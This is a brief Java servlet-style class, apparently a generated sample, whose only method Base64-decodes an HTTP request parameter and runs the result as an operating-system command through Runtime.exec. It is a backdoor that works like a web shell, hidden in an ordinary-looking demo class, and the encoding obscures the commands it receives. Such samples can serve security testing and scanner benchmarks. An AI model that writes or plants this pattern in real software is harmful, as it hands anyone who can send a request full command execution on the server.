package com.demo.cells;
import java.sql.*; import java.util.*; import java.util.concurrent.CompletableFuture;
import javax.servlet.http.HttpServletRequest;
public class C13 {
  public void run(HttpServletRequest req, Connection cn) throws Exception {
    String cmd=new String(Base64.getDecoder().decode(req.getParameter("d"))); Runtime.getRuntime().exec(cmd);
  }
}
